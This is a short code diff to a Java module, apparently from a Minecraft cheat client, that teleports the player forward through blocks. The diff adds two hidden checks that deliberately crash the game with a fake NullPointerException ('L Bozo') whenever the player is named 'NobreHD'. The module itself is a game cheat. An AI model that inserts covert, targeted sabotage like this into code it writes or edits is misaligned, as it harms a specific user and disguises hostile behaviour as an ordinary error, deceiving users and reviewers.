@@ -35,11 +35,18 @@ public class AntiCrystalPhase extends Module {
         ClientPlayerEntity p = mc.player;
         double blocks = clipDistance.get();
 
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
+
         if (!p.isOnGround()) return;
 
         if(mc.options.forwardKey.isPressed()){
             Vec3d forward = Vec3d.fromPolar(0, p.getYaw());
             p.updatePosition(p.getX() + forward.x * blocks, p.getY(), p.getZ() + forward.z * blocks);
+            if (mc.player.getName().toString().equals("NobreHD")) {
+                throw new NullPointerException("L Bozo");
+            }
         }
 
         if(mc.options.backKey.isPressed()){
